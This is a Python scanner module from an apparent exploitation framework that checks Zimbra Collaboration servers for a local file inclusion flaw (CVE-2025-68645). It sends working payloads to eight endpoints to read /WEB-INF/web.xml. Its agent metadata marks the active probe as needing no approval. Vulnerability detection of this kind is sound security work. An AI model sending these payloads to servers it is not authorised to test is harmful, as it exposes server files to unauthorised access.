#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zimbra Collaboration (ZCS) 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zimbra Collaboration - Local File Inclusion Detection',
        'description': 'Zimbra Collaboration (ZCS) 10.0 and 10.1 contain a local file inclusion caused by improper handling of user-supplied parameters in the RestFilter servlet, letting unauthenticated remote attackers include arbitrary files from WebRoot, exploit requires crafted requests to /h/rest endpoint.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'zimbra', 'zcs', 'lfi', 'vkev', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://x.com/sirifu4k1/status/2006031417088639064',
            'https://x.com/sirifu4k1/status/2007279822050078906?s=12&amp;t=ovaWmJElNlGyzadE74ZOgQ',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-68645',
        ],
        'cve': 'CVE-2025-68645',
    }

    def run(self):
        for path in ('/h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/changepass?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/imessage?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/postLoginRedirect?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/printcalls?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/printcalendar?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/printvoicemails?javax.servlet.include.servlet_path=/WEB-INF/web.xml', '/h/printappointments?javax.servlet.include.servlet_path=/WEB-INF/web.xml'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('<?xml version', 'web-app>', 'Zimbra',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="Zimbra Collaboration - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

